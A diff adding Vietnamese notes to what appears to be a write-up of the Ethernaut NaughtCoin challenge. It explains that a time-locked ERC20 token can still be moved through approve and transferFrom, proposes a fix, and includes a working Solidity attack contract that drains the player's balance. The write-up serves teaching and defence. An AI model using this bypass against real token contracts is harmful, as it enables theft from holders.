@@ -1,4 +1,37 @@
+### Kết luận 
+- Lỗ hổng: Hàm transfer bị khóa nhưng `player` vẫn có thể sử dụng hàm `approve` và `transferFrom` để chuyển tokens. (theo chuẩn ERC20).
+- Cách phòng tránh: Modifier `lockTokens` cần được mở rộng để kiểm tra mọi hành động ảnh hưởng đến số dư của `player`, bao gồm cả `approve` và `transferFrom`.
+- Hoặc có thể chặn trực tiếp trong hàm.
+VD:
+```solidity
+function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
+    if (sender == player) {
+        require(block.timestamp > timeLock, "Tokens are locked.");
+    }
+    return super.transferFrom(sender, recipient, amount);
+}
+
+```
 ### Contract tấn công
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
+interface INaughtCoin is IERC20 {}
+contract NaughtCoinAttack{
+    INaughtCoin public victim;
+    constructor (address challenge){
+        victim = INaughtCoin(challenge);
+    }
+    function attack(address _player) public payable{
+        require(victim.balanceOf(_player) > 0, "Player has no tokens to steal");
+        victim.transferFrom(_player, address(this), victim.balanceOf(_player));
+    }
+    // Cần gọi hàm approve để cấp quyền trước khi tấn công ở hợp đồng NaughtCoin.
+    // victim.approve(address(this), victim.balanceOf(msg.sender));
+}
+```
 ### Contract 
 ```solidity
 // SPDX-License-Identifier: MIT
